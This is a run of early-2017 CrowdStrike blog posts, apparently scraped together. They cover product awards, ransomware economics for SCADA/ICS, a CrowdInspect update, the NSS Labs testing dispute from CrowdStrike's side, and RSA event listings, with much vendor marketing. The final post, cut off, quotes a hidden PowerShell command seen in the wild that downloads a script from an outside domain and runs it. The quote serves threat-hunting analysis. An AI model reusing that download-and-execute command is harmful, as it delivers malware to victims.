<p>The post <a href=""https://www.crowdstrike.com/blog/understanding-indicators-attack-ioas-power-event-stream-processing-crowdstrike-falcon/"" rel=""nofollow"">Understanding Indicators of Attack (IOAs): The Power of Event Stream Processing in CrowdStrike Falcon</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/understanding-indicators-attack-ioas-power-event-stream-processing-crowdstrike-falcon/
CrowdStrike Falcon Intelligence Receives SC Magazine Highest Recommendation and Rating,"<p>CrowdStrike Falcon<span style=""font-weight: 400;"">™ </span>Intelligence, powered by the CrowdStrike Global Intelligence Team, received <a href=""https://www.scmagazine.com/crowdstrike-falcon-intelligence/review/9333/"">top honors from SC Magazine</a> with the highest possible rating of five stars across the board, earning the “SC Magazine Recommended” status. This is the same intelligence that enriches the CrowdStrike Falcon Endpoint Protection Platform – combining the two provides unparalleled protection for CrowdStrike customers.</p>
<p>In their review,  SC Magazine cites Falcon Intelligence as “a solid choice for your cyber intel arsenal. We make it our Recommended choice,” with no weaknesses found. CrowdStrike received five stars across each of the testing parameters: Features, Documentation, Value for Money, Performance, Support and Ease of Use.</p>
<p>In honoring CrowdStrike Falcon Intelligence with their highest rating, SC Magazine’s Peter Stephenson writes, “This absolutely is a tool worth having for organizations that are concerned with cyber espionage, particularly financial institutions, government agencies and the like.”</p>
<p>CrowdStrike’s Falcon Intelligence delivers in-depth and historical understanding of adversary activity, providing strategic, operational and technical reports that cover targeted intrusion, hacktivists and ecrime adversaries. Immediate alerting and warning as well as detailed analysis of the tactics, techniques and procedures (TTP) used by adversaries, instantly increase organizations’ defense capabilities against today’s most persistent and sophisticated attackers.</p>
<p><strong>Other Falcon Intelligence strengths cited by the SC Magazine report include:</strong></p>
<p><strong>The depth and breadth of analysis and reporting available, </strong>delivered via a wide range of formats including HTML, PDF and API. The review mentions strategic intelligence reports, actor profiles, technical intelligence reports, actionable threat intelligence feeds and others. The review from SC labs experts also mentions CrowdStrike’s tailored intelligence and quarterly intelligence briefing webinars.</p>
<p><strong>The ease with which Falcon platform deploys and begins capturing data</strong>. According to Stephenson’s report, “The sensor communicates automatically with the cloud and then captures all of the data it needs to begin analysis. There are a lot of options for how you analyze your system.”</p>
<p><strong>CrowdStrike inclusive support and documentation</strong>. The report says, “Support is included with the subscription and once this is up and running &#8211; this is an excellent product. Documentation is clear and well-written overall.”</p>
<p>Read the entire SC Magazine article recommending <a href=""https://www.scmagazine.com/crowdstrike-falcon-intelligence/review/9333/""> CrowdStrike Falcon Intelligence</a>.</p>
<p>Learn more about <a href=""https://www.crowdstrike.com/products/falcon-intelligence/""> CrowdStrike Falcon Intelligence</a> and the Global Intelligence Team: Download the <a href=""https://www.crowdstrike.com/resources/data-sheets/falcon-intelligence/""> data sheet</a> or read about CrowdStrike’s <a href=""https://www.crowdstrike.com/products/falcon-intelligence/intelligence-subscriptions-offerings/""> cyber intelligence subscription offerings</a>.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/crowdstrike-falcon-intelligence-receives-sc-magazine-highest-recommendation-and-rating/"" rel=""nofollow"">CrowdStrike Falcon Intelligence Receives SC Magazine Highest Recommendation and Rating</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/crowdstrike-falcon-intelligence-receives-sc-magazine-highest-recommendation-and-rating/
The Economics of Ransomware: How SCADA/ICS Changes the Equation,"<p>Recent reports of <a href=""https://www.scmagazineuk.com/rsa-2017-researchers-create-ransomware-for-industrial-control-systems/article/638130/"">SCADA/ICS proof-of-concept ransomware</a> have spurred fresh discussion on the topic. Few threats exceed the level of concern that ransomware generates in the minds of corporations. There are some fundamental economics behind ransomware, though, that can help predict its evolution, particularly in view of the potential for attacks on public infrastructure.</p>
<h3>Ransomware Economics</h3>
<p>Consider ransomware as a “product.” Normally we think of products as offering some positive value, for example allowing us to produce more output or reduce our costs, or entertain us, etc. Ransomware is a product with negative value, where the victim can avoid costs by paying for the product. Since the product is destructive rather than constructive and relies on threatening the value built by others, it is parasitic and criminal — but still subject to economic principals.</p>
<p>One economic observation is that the price should not exceed the value of the lost — or <em>potentially</em> lost — resource. That value is somewhat subjective, but there are often limits to the victim’s ability to pay, and obviously there are limits to the attacker’s ability to assess the value of the lost resource. So the attacker is incentivized to choose a ransom price that is both within the victim’s ability to pay, and does not exceed what the victim considers the potential loss value. In addition, since most of these attacks are targeting hundreds, thousands, or more potential victims, the attacker typically must make an educated guess as to a value that will net the most overall gain.</p>
<p>However, things can get somewhat more complicated. Some attackers taking advantage of the ransomware phenomenon make &#8220;poor quality&#8221; products that destroy resources without offering the ability to recover them. Some attackers do not or cannot consistently provide the ability to recover the resources lost, even upon payment — for example, by failing to provide usable decryption keys or utilities. These poor quality or “fake” ransomware attacks undermine the credibility of the attacker and, to some extent by association, the credibility of &#8220;quality&#8221; ransomware purveyors. This undermining of victim/consumer confidence places another variable into the pay-or-don&#8217;t-pay calculation: The victim has to consider the likelihood that their loss will <em>not </em>be restored upon paying the ransom. The higher the likelihood (perceived, at least) that the resource will not be restored, the lower the expected return for paying the ransom, driving down the &#8220;value&#8221; of the ransom. This in turn weighs on the price attackers can demand. While cheaper to produce and operate, poor quality ransomware would appear to have a lot of factors that suppress it. As a result, it should generally only be able to maintain a small minority share of the market, at least once the market is saturated.</p>
<p>These economics appear to still be playing out. Current indications are that ransomware price demands are increasing, which likely means the market (such as it is) has not yet reached an equilibrium. When that occurs, some of the mitigating economic pressure on producers of poor quality ransomware will be removed. This appears to be bolstered by the fact that the number of ransomware attacks also continues to increase.</p>
<h3>Infrastructure-as-a-Victim (IaaV)</h3>
<p>With the advent of <a href=""https://www.nytimes.com/2017/01/30/world/europe/hotel-austria-bitcoin-ransom.html"">real IoT ransomware</a> and <a href=""https://www.bleepingcomputer.com/news/security/researchers-create-poc-ransomware-that-targets-ics-scada-systems/"">proof-of-concept infrastructure-targeting ransomware</a> — phenomena long predicted by myself and others — things get even scarier. Potential threats to infrastructure are not new. Nation states have long had the ability to negatively impact their adversaries’ infrastructure. However, the risks of escalation and even mutually assured destruction (MAD) tend to lead to a natural detente. Governments must weigh the benefits of such operations against the myriad risks of political blowback, collateral damage, or discovery and subsequent reprisal.</p>
<p>When criminal actors engage in attacks on infrastructure, however, the possibility of detente is not a factor and the conflict becomes asymmetric, just as it always has been with ransomware. When ransomware moves into the kinetic realm, either by impacting physical infrastructure or tangential systems that can adversely affect physical infrastructure, the conflict has been elevated to the next level.</p>
<p>It’s hard to fathom the potential loss of value from ransoming resources such as clean water, electricity, transportation, and other infrastructure relied on by thousands or even millions of people. It also demonstrates that there is significantly more potential loss to monetize for the attacker, and means that increased attempts to threaten public infrastructure are virtually inevitable. Similarly, it is hard to predict how bold attackers will be in their attempts to hold infrastructure hostage &#8211; but it would be the epitome of imprudence to simply wait to find out.</p>
<h3>Mitigation</h3>
<p>Just as the resource loss caused by ransomware can become more severe and impactful in IaaV scenarios, so efforts must be made to increase the potential and actual costs to would-be attackers. Severe penalties increase the riskiness of such ventures, and better security and isolation are needed for our infrastructure. It may be that legislation is needed to spur preparatory action in the private sector, which historically has been reactive, undereducated and unprepared in this area. While robust backups are an effective mitigation for data-encrypting ransomware, no such silver bullet exists in the space of ICS (industrial control systems) such as SCADA (supervisory control and data acquisition). Action must be taken by the organizations responsible for those systems since the threats posed are a potential “tragedy of the commons,” a venerated economic principle that describes how unchecked self-interest can be detrimental to the common good.</p>
<p>For the time being, the only saving grace is that the attack surface area of SCADA/ICS systems is somewhat fractured. While corporate and consumer attacks can be carried out on a massive scale through email phishing, our public infrastructure is not quite the <a href=""http://archive.wired.com/politics/security/news/2004/02/62307?currentPage=all"">monoculture</a> that the desktop space has become. But that is cold comfort as the sheer scope of the problem of securing vulnerable public infrastructure comes increasingly into focus.</p>
<h3>Conclusion</h3>
<p>The problems caused so far by ransomware only hint dimly at the paradigm&#8217;s future destructive potential. We need to apply foresight — paying heed to early warnings that are signs of possible, if not likely, things to come. While there is no silver bullet to prevent ransomware, there are steps we can take to secure our information and infrastructure, such as significantly reducing exposure of critical infrastructure to the public Internet and improving access control, and deploying effective, next-generation endpoint protection. Those steps must be taken soon, however, as applying simple economics shows that it’s only a matter of time before the problem gets worse.</p>
<p>The <a href=""https://www.crowdstrike.com/products/"">CrowdStrike Falcon™ </a><a href=""https://www.crowdstrike.com/products/"">platform</a> defends organizations <a href=""https://www.crowdstrike.com/blog/tech-center/prevent-ransomware-crowdstrike-falcon-host/"">against ransomware</a> and other advanced threats by combining next-generation AV and indicator of attack (IOA) technology with EDR (endpoint detection and response) and a 24/7 threat hunting service — all delivered via a single lightweight agent.</p>
<p>Register for my webcast on <strong>March 29, 2017, 11 am EST/4  pm GMT and 8 am PST/8 am AEDT (March 3oth)</strong> where I will delve more deeply into evolving ransomware threats and explain how Falcon prevents and detects even the most complex &#8220;file-less&#8221; ransomware:</p>
<section class=""dark-grey form-container"">
<p class=""text karla-bold caps white"" style=""font-size: 18px !important;"">IS RANSOMWARE MORPHING BEYOND THE ABILITY OF STANDARD APPROACHES TO STOP IT?</p>
<p class=""text grey"" style=""font-size: 16px !important;"">Learn how to prevent &amp; detect even the most complex “file-less” ransomware exploits. &#8211; LIVE WEDNESDAY, MARCH 29, 2017 &#8211;</p>
<p></p>
</section>
<p>The post <a href=""https://www.crowdstrike.com/blog/economics-ransomware-scadaics-changes-equation/"" rel=""nofollow"">The Economics of Ransomware: How SCADA/ICS Changes the Equation</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/economics-ransomware-scadaics-changes-equation/
Dark Reading: Why Ransomware Continues to Be a Serious Threat,"<p>A recent article on DarkReading.com, titled <a href=""http://www.darkreading.com/endpoint/4-reasons-why-you-should-take-ransomware-seriously/a/d-id/1327933""> “4 Reasons Why You Should Take Ransomware Seriously</a>,” outlines the persistence of ransomware as a significant threat to organizations, and explains why it will continue to be a formidable challenge throughout 2017.</p>
<p>Authored by CrowdStrike’s VP of Product Marketing Dan Larson, the article cites statistics from an <a href=""http://icitech.org/wp-content/uploads/2016/03/ICIT-Brief-The-Ransomware-Report2.pdf"">Institute for Critical Infrastructure Technology (ICIT) 2016</a> report indicating an alarming increase in successful ransomware attacks. Coupled with <a href=""http://money.cnn.com/2016/04/15/technology/ransomware-cyber-security/"">estimates based on FBI reports</a> suggesting that the combined take from ransomware crimes in 2016 can be counted in the billions of dollars, there is every indication that ransomware-related losses will continue to mount as savvy cybercriminals are attracted by potential payouts that are bigger, faster and “less risky than the advanced persistent threat exploits often used to steal credit card numbers and other sensitive data,” Larson says.</p>
<p>Why is ransomware such an intractable problem, and why should organizations continue to care?  Larson cites four key reasons why companies need to remain vigilant:</p>
<ol>
<li>Ransomware is constantly evolving, outwitting security measures with innovative tactics such as leveraging vulnerabilities in trusted systems and deleting backup files.</li>
<li>Standard security measures are inadequate against the increasingly sophisticated tactics ransomware criminals are adopting.</li>
<li>Ransomware can pose a compliance risk and companies have reportedly been fined for failing to have ransomware defense measures in place &#8212; even if they haven’t actually experienced an attack.</li>
<li>Recovering your data after an attack is a complex process, and paying your attacker provides no guarantee that your files will be recovered.</li>
</ol>
<p>Larson concludes that organizations can improve their security posture and lessen their chances of falling victim to a ransomware attack by adopting “a multifaceted approach with complementary prevention and detection methods.”  In particular, Larson recommends that companies increase their “focus on indicators of attack (IOAs), a form of behavior-based detection that looks at the underlying actions taken by the threat, rather than trying to pattern-match a new file to a signature.”</p>
<p>The <a href=""https://www.crowdstrike.com/products/"">CrowdStrike Falcon™ Platform</a> incorporates IOA-based detection and next-generation AV capabilities to combat today’s most advanced ransomware threats, and Falcon is the only endpoint protection platform that combines those methods with EDR (endpoint detection and response) and a 24/7 threat hunting service — all delivered via a single lightweight agent. For further information on the rise of ransomware and best practices for prevention and detection, read the report: <a href=""https://www.crowdstrike.com/resources/white-papers/ransomware-white-paper/""> Ransomware: A Growing Enterprise Threat</a>.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/dark-reading-ransomware-continues-serious-threat/"" rel=""nofollow"">Dark Reading: Why Ransomware Continues to Be a Serious Threat</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/dark-reading-ransomware-continues-serious-threat/
"VirusTotal Lookups Are Back in CrowdInspect, CrowdStrike’s Popular Free Tool","<p>CrowdStrike <em>CrowdInspect</em> version 1.5.0.0 has arrived.</p>
<p>Many of you are  familiar with CrowdInspect, a simple-to-use and understand Windows application that lists processes running on your computer, along with details of any network connections those processes make. Additional useful information includes reputation of the domain the process is connected to from <a href=""https://www.mywot.com/"">WoT</a> ; whether the process is known to be malicious (<a href=""https://www.team-cymru.org/"">Team Cymru Malware Hash Registry</a>); and virus details from <a href=""https://www.virustotal.com/"">VirusTotal</a>. CrowdInspect was the first tool of its kind to offer such services.</p>
<p>Due to the popularity of CrowdInspect<em>,</em> we eventually were forced to remove the VirusTotal feature last year, since we frequently exceeded our allotted query quota. The tool continued to operate without this functionality, but it was sorely missed by our users.</p>
<p>Today we can announce that with this new version, VirusTotal lookups are back!</p>
<p>The kind folks at VirusTotal have provided us with unrestricted API access via direct connection to their servers. We would like to thank them very much for this ability that now provides you with free, fast virus information from VirusTotal’s vast database.</p>
<p>The new VirusTotal API only provides an overall score for the file in question, not the detailed list of AV vendors that we had provided previously. For the majority of users, this should suffice.  However, if you wish to see all of the details about the file, we provide a link in the details window, which will open your web browser to the associated page at<a href=""http://www.virustotal.com/""> www.virustotal.com</a> where you will find every detail. (To access the page, right click an item in the list and select “<em>View VT Test Results</em>,” or click the toolbar icon.)</p>
<p>In addition to the new built-in direct VirusTotal lookup feature, we have added the ability to provide your own personal key to query the public API. This provides the same details as the old version of CrowdInspect, however, queries are rate-limited by VirusTotal to four per minute, which means  population of the VT column in the tool will take longer. For this reason, we recommend that you stay with the built-in custom API option.</p>
<p>By default, when an unknown file is encountered, the built-in custom VirusTotal option uploads the file to their servers and adds it to their collection for analysis.</p>
<p>Options to control this behavior can be found in the <em>About</em> section of the CrowdInspect tool. Access to it is presented after accepting the EULA on first start, and it can be reached again by clicking the <em>About</em> toolbar icon when the application is running.</p>
<p><img alt=""crowdinspect"" class=""alignnone wp-image-18549"" height=""189"" src=""https://www.crowdstrike.com/blog/wp-content/uploads/2017/02/CrowdInspect.png"" width=""800"" /></p>
<p>When switching between the two VirusTotal options, only newly appearing processes will reflect the change in results. As previously mentioned, the built-in custom API only provides overall scores, whereas the personal API key (using the VT public API) will provide a list of how each individual AV vendor marked the file. It is recommended that you restart the application to provide the level of detail you require for all processes.</p>
<p>We hope you enjoy the tool and its new features. It can be downloaded from our <a href=""https://www.crowdstrike.com/resources/community-tools/crowdinspect-tool/"">CrowdInspect</a> Page.</p>
<p>Learn more about CrowdStrike Falcon’s powerful endpoint protection platform and the benefits of replacing your legacy AV solution &#8212; register for our webcast today:  <a href=""https://www.crowdstrike.com/resources/crowdcasts/time-come-replace-antivirus-solution/"">How to Replace Your Legacy Antivirus Solution with CrowdStrike</a>.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/virustotal-lookups-are-back-in-crowdinspect-crowdstrikes-popular-free-tool/"" rel=""nofollow"">VirusTotal Lookups Are Back in CrowdInspect, CrowdStrike’s Popular Free Tool</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/virustotal-lookups-are-back-in-crowdinspect-crowdstrikes-popular-free-tool/
UPDATE: NSS Labs Report Confirms Testing of CrowdStrike Falcon was Incomplete and Wrong,"<h4>February 15, 2017</h4>
<ul>
<li style=""font-weight: 400;""><span style=""font-weight: 400;"">NSS’ report plainly states that testing of CrowdStrike Falcon was incomplete, and therefore, the results are invalid. </span></li>
<li style=""font-weight: 400;""><span style=""font-weight: 400;"">Including Falcon in the report based on an incomplete analysis is contrary to basic industry standards for testing.</span></li>
<li style=""font-weight: 400;""><span style=""font-weight: 400;"">All Falcon prevention capabilities were disabled during the testing, and therefore the report results are wrong.</span></li>
<li style=""font-weight: 400;""><span style=""font-weight: 400;"">CrowdStrike declined to participate in a public test after completing a private test with NSS, based on NSS’ flawed and improper testing execution.</span></li>
</ul>
<p><span style=""font-weight: 400;"">On February 14, 2017, NSS Labs released a report available for purchase for approximately $12,000 claiming to analyze and address various advanced endpoint protection products in the security marketplace. After repeated requests, we were finally granted access to the report.  Due to the extraordinary cost of the report, many readers of this blog (including people who have already commented publicly) have not reviewed the actual report.  We want to set the record straight.  </span></p>
<h4>Here are the facts:</h4>
<h4>1: The testing of CrowdStrike Falcon was never completed</h4>
<p>CrowdStrike is the only vendor in the report identified by a red dot, which &#8212; as NSS explicitly acknowledges &#8212; means it obtained only &#8220;partial data&#8221; for CrowdStrike. In fact, three out of the nine subcategories covered by the NSS AEP Group Test were labeled as &#8220;Test Not Complete&#8221; for CrowdStrike, meaning one third of the tests conducted on the CrowdStrike product were never completed. Including Falcon in the report based on an incomplete analysis is contrary to basic industry standards for testing.</p>
<h4>2: CrowdStrike Falcon prevention capabilities were disabled during the incomplete public test</h4>
<p><span style=""font-weight: 400;"">Based upon a review of the telemetry and full audit logs in the Falcon Platform, prevention settings were turned off during the entire test period. The report ignores this simple fact.  As a result of the failure to turn on prevention, the report’s conclusions about the total cost of ownership, the blocking of malware, exploit mitigation, and blended threat prevention are simply false.</span></p>
<p><span style=""font-weight: 400;"">In addition, NSS states “over the course of the test, Falcon Host blocked 70.0% of malware delivered by HTTPS.” Since prevention was completely turned off during the entire time of the testing, no blocks ever triggered in the UI, where did the 70.0% block rate come from? And since this result, as well as results for all other preventions that NSS had given us credit for, are wrong, it calls into question all other results.</span></p>
<p>Based on the above, the inclusion of CrowdStrike in the report is wrong and inconsistent with industry testing standards, and presents an inaccurate and misleading picture of our Falcon product.</p>
<h4>Below is some background to why we declined to participate in the NSS Labs AEP Group Test:</h4>
<ol>
<li><span style=""font-weight: 400;"">Once we learned that NSS had a deeply flawed methodology and made basic errors such as naming Firefox, Skype and Java (which are digitally signed by legitimate vendors) as malware, we had little faith that any test performed by NSS would be accurate. </span></li>
<li><span style=""font-weight: 400;"">We were also aware of other security providers such as FireEye and Palo Alto previously voicing public concerns surrounding NSS’ prior public testing activities.  </span></li>
<li><span style=""font-weight: 400;"">We directly engaged with NSS by telephone and through email to address  problems with its testing methodology. NSS representatives admitted they had made mistakes.</span></li>
<li><span style=""font-weight: 400;"">We initially sought to work collaboratively with NSS to address the testing issues. We told NSS’s CEO, Virkram Phatak, that CrowdStrike would not participate in the public test unless they fixed the underlying problems in the testing methodology. Furthermore, we also informed him of his contractual obligations by email and provided him a link to our terms of service, which expressly prohibits access to Falcon for unauthorized competitive testing. In addition, our counsel sent a letter to NSS’ external counsel restating these limitations.</span></li>
<li><span style=""font-weight: 400;"">NSS ignored our concerns and our explicit direction to not go forward with the public testing.  Instead, NSS colluded with a reseller, David Thomason, to create credentials from a customer account of a Fortune 1000 company in order to provide NSS access to the Falcon platform.  This behavior was in violation of our contracts, multiple provisions of our license agreements, and various laws.</span></li>
<li><span style=""font-weight: 400;"">Not to be deterred, NSS went ahead and published its admittedly incomplete report.</span></li>
<li><span style=""font-weight: 400;"">As  a company that cares deeply about the integrity of ethical product testing and the protection of our intellectual property and contractual rights, we recently filed suit in Federal court.  This litigation remains ongoing, and we intend to pursue our claims against NSS and hold it accountable for its improper conduct.</span></li>
</ol>
<p><span style=""font-weight: 400;"">Taken in total, NSS’ failure to conduct the most basic of fact checking during the private testing and the well publicized history of problems with NSS testing ultimately gave us no confidence that NSS Labs could conduct accurate testing of our security products. Therefore, we declined to participate in the public test.</span></p>
<p>For any questions regarding the NSS Report and CrowdStrike’s response, please email: <a href=""mailto:FactsAboutTesting@crowdstrike.com"">FactsAboutTesting@crowdstrike.com</a></p>
<p>Don&#8217;t take our word for it, review these reputable industry organizations and what they have to say about our technology. CrowdStrike was recently named Visionary in the <a href=""https://www.crowdstrike.com/resources/reports/gartner-magic-quadrant-positions-crowdstrike-visionary/"" target=""_blank"">Gartner Magic Quadrant for Endpoint Protection Platforms</a> and CrowdStrike Falcon has been independently tested and certified as an effective AV replacement by <a href=""https://www.crowdstrike.com/wp-content/brochures/avc_mrg_biz_2016_nextgen_en.pdf"">AV-Comparatives</a> and <a href=""https://selabs.uk/download/20160728001-report.pdf"">SE Labs</a><strong>.</strong></p>
<hr />
<p>&nbsp;</p>
<p>On Friday, February 10, 2017, CrowdStrike filed suit in U.S. Federal District Court against NSS Labs to hold it accountable for unlawfully accessing our software, breaching our contract, pirating our software, and improper security testing. Regardless of test results (which we have not seen), CrowdStrike is making a stand against what we believe to be unlawful conduct.</p>
<p>CrowdStrike values independent testing and we initially engaged NSS to conduct a private test of our software. We soon learned their methodologies were deeply flawed. For example, they made basic errors including labeling legitimate software such as Firefox, Skype, and Java, digitally signed by vendors, as malicious &#8211; leaving us with no confidence in their testing methodology or ability. As a result, we decided not to participate in a public test and expressly declined NSS’ later request to conduct public testing. After explicitly telling NSS on multiple occasions that they were prohibited from using our software for public testing, they colluded with a reseller and engaged in a sham transaction to access our software to conduct the testing. In doing so, NSS breached their contract with CrowdStrike, violated our end user licensing agreement (EULA), misappropriated our intellectual property, and improperly used credentials. Once we became aware that an unauthorized user account associated with a reseller was used for the tests, we suspended access immediately. Any test results that NSS did obtain are incomplete and materially flawed.</p>
<p><strong>CrowdStrike is Committed to Qualified Independent Testing and Validation</strong></p>
<p>CrowdStrike supports independent and ethical validation—including public testing—for our products and for the industry. In fact, we underwent public testing with two reputable independent testing houses: AV-Comparatives and SE Labs in the past six months. We believe the actions of NSS are detrimental to the security industry and they need to be held accountable. We reject the unethical, illicit, and subversive way that NSS does business and the harm it brings to our industry, security research, and most of all, the users of security technologies. We hope that other leaders in the security industry will join us in speaking out and taking action against those who seek to harm our industry and security for their own gain.</p>
<p>To be crystal clear, the results of the report are unknown to us at this time and irrelevant, we are suing NSS because of their illicit activity, breach of contract and misappropriation of our intellectual property.</p>
<p>Please follow our blog as we continue to share more updates on this matter.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/crowdstrike-initiates-legal-action-nss-labs-misappropriation-intellectual-property-engaging-sham-transaction-illegally-obtain-access-falcon-software/"" rel=""nofollow"">UPDATE: NSS Labs Report Confirms Testing of CrowdStrike Falcon was Incomplete and Wrong</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/crowdstrike-initiates-legal-action-nss-labs-misappropriation-intellectual-property-engaging-sham-transaction-illegally-obtain-access-falcon-software/
CrowdStrike Falcon Winter Release: Setting a New Standard in Endpoint Protection [VIDEO],"<p><center></center></p>
<p>Today we announce new capabilities and features that provide customers with unmatched prevention against malware and malware-free attacks, and a variety of unique product modules that further expand <a href=""https://www.crowdstrike.com/products/"">CrowdStrike’s suite of offerings</a>. Among the innovative, new capabilities being introduced is enhanced endpoint machine learning that advances and augments CrowdStrike’s behavioral-based machine learning prevention in the cloud, for complete and effective protection across all endpoints. With this new enhancement, even sensors completely disconnected from the cloud receive full antivirus (AV) protection against malware and malware-free attacks. Now, all CrowdStrike Falcon™ customers have access to this groundbreaking functionality and its expanded lineup of features, capabilities, and reliability for fast turnaround and increased throughput.  </p>
<p>CrowdStrike is setting a new standard in endpoint security – providing our customers with the industry’s most effective solution to prevent, detect, respond to, and predict attacks from even the most sophisticated adversaries. For more details on this expansion of the  Falcon platform, please check out my video blog above.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/crowdstrike-offerings-set-a-new-standard-in-endpoint-protection/"" rel=""nofollow"">CrowdStrike Falcon Winter Release: Setting a New Standard in Endpoint Protection [VIDEO]</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/crowdstrike-offerings-set-a-new-standard-in-endpoint-protection/
Explore the “Power of Opportunity” with CrowdStrike at RSA 2017,"<p><a href=""https://www.crowdstrike.com/rsa/"">RSA 2017</a> is almost upon us, though it hardly seems possible, the year has gone by so quickly. For the cybersecurity industry, it was another year of challenges, with old adversaries putting new spins on their exploits and new adversaries emerging.</p>
<p>The RSA theme this year is “Power of Opportunity.” This is taken from Zen teachings exhorting us to approach everything as though it was for the first time: “In the beginner’s mind, there are many possibilities. In the expert’s mind, there are few.” For all of us in the cybersecurity industry, this is a powerful reminder that many of the challenges we face require new ways of thinking and different approaches if we are to be successful. At CrowdStrike, we take this to heart, which is why we have pioneered a new approach to endpoint security, one that we look forward to sharing with you at this year’s RSA. We hope you will visit our <strong>booth, #2345 in Moscone South</strong>, and meet with one of our security experts to discuss the security challenges you face and learn how the CrowdStrike Falcon™ Platform can help you better protect your organization.</p>
<p>CrowdStrike leadership, which includes some of the world’s foremost cybersecurity experts, will be conducting important sessions you won’t want to miss, and we’ll be showcasing our exciting new CrowdStrike Falcon Winter Release throughout the event. The in-depth sessions will examine some of today’s most pressing cybersecurity issues:</p>
<ul>
<li>As the physical and digital worlds come together, a variety of dangerous threats are emerging. Learn how to recognize these threats and develop strategies to defend your organization.</li>
<li>Multiple industry sectors from senior government levels to private companies were the targets of concerted cyber attacks in 2016. Find out how world-renowned experts responded to these attacks, and how they will apply what they’ve learned to future incident response scenarios.</li>
<li>Watch demos of the latest intrusion tradecraft employed by sophisticated nation-state adversaries, such as China, Russia and Iran.</li>
<li>Explore the use of natural language processing in threat intelligence and its impact on the VirusTotal Platform.</li>
</ul>
<p>Here is a list of the sessions, and links for reserving your seat:</p>
<p><strong>Session:</strong><a href=""https://www.rsaconference.com/events/us17/agenda/sessions/6827-hacking-exposed-real-world-tradecraft-of-bears""> <strong>Hacking Exposed: Real-World Tradecraft of Bears, Pandas and Kittens<br />
</strong></a><strong>Speakers: </strong>George Kurtz, CrowdStrike Cofounder and CEO<br />
Dmitri Alperovitch, CrowdStrike Cofounder and CTO<br />
<strong>When/Where:</strong> Feb. 15, 2017 | 9:15 – 10:00 AM | Marriott Marquis | Room: Yerba Buena 5</p>
<p><strong>Session:</strong><a href=""https://www.rsaconference.com/events/us17/agenda/sessions/5665-au-naturale-natural-language-processing-and-threat""> <strong>Au Naturale: Natural Language Processing and Threat Intel<br />
</strong></a><strong>Speaker: </strong>Adam Meyers, CrowdStrike VP of Intelligence|<br />
<strong>When/Where:</strong> Feb. 15, 2017 | 9:15 – 10:00 AM | Moscone South | Room: 307</p>
<p><strong>Session:</strong><a href=""https://www.rsaconference.com/events/us17/agenda/sessions/7009-nation-under-attack-live-cyber-exercise""> <strong>Nation Under Attack: Live Cyber-Exercise<br />
</strong></a><strong>Speaker:  </strong>Dmitri Alperovitch, CrowdStrike Cofounder and CTO<br />
<strong>When/Where:</strong> Feb. 15, 2017 | 4:00 – 6:00 PM | Moscone West | Room: 2024</p>
<p><strong>Session:</strong><a href=""https://www.rsaconference.com/events/us17/agenda/sessions/4787-corporate-security-where-the-physical-and-digital""> <strong>Corporate Security: Where the Physical and Digital Worlds Collide<br />
</strong></a><strong>Speaker:  </strong>Shawn Henry, President of CrowdStrike Services and CSO<br />
<strong>When/Where:</strong> Feb. 17, 2017 | 11:30 AM – 12:15 PM | Marriott Marquis | Room: Yerba Buena 9</p>
<p>CrowdStrike is also hosting several special events, including:</p>
<ul>
<li><strong>Book signing </strong>with CrowdStrike CEO and author, George Kurtz, signing copies of his ground-breaking book, <strong>“Hacking Exposed,</strong>” on Tuesday, Feb. 14, 2:30-3:15 PM in the CrowdStrike booth</li>
<li><strong>CrowdStrike Services lunch</strong>, “After an Attack, What’s Next?”, with Shawn Henry, President of CrowdStrike Services, Feb. 14, 11:30 AM to 1:00 PM at the Press Club</li>
<li><strong>Customer lunch and Intel Briefing</strong> from Adam Meyers, VP of Intelligence, Wednesday, Feb. 15, 11:30 AM to 1:00 PM at the Press Club</li>
</ul>
<p>Attendees can also visit our <strong>booth #2345 in Moscone South</strong> to learn how CrowdStrike is redefining endpoint protection to defeat the dangerous threats your organization is facing, now and in the future. Click for more information on <a href=""https://www.crowdstrike.com/rsa/"">CrowdStrike at RSA 2017</a>.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/explore-power-opportunity-crowdstrike-rsa-2017/"" rel=""nofollow"">Explore the “Power of Opportunity” with CrowdStrike at RSA 2017</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/explore-power-opportunity-crowdstrike-rsa-2017/
Blocking Malicious PowerShell Downloads,"<p>As a next-gen endpoint protection solution, uniquely unifying next-gen antivirus with endpoint detection and response, CrowdStrike Falcon™ provides a unique view of malicious activity, making hunting malware and intrusions very different from the method those of us in the security profession are used to, which typically relies on network-centric sensors. Also, it means that the adversaries are required to put more effort into hiding their end-to-end processing on their victim hosts.</p>
<p>Falcon allows us to hunt for malicious activity across more than 30 billion daily execution events, recorded by millions of Falcon sensors located in 176 countries and correlated in the CrowdStrike ThreatGraph™. Using these capabilities, our analysts came across a peculiar web download in early November:</p>
<div class=""blog-post-code-wrapper"">
<p><span style=""font-weight: 400;"">&#8220;c:\windows\system32\windowspowershell\v1.0\powershell.exe&#8221; -windowstyle hidden $d=$env:temp+[char][byte]92+&#8217;1478810889388.js&#8217;;(new-object system.net.webclient).downloadfile(&#8216;http&#8217;+&#8217;s://rivevetoood.org/4421148251951/1478810791469497/flashplayer.jse&#8217;,$d);invoke-item $d;</span></p>
</div>
<p>The texture of this command stands out from typical administrative PowerShell commands. However, some of its maliciousness is subjective, so it’s worth spending some time talking about why it stands out.</p>
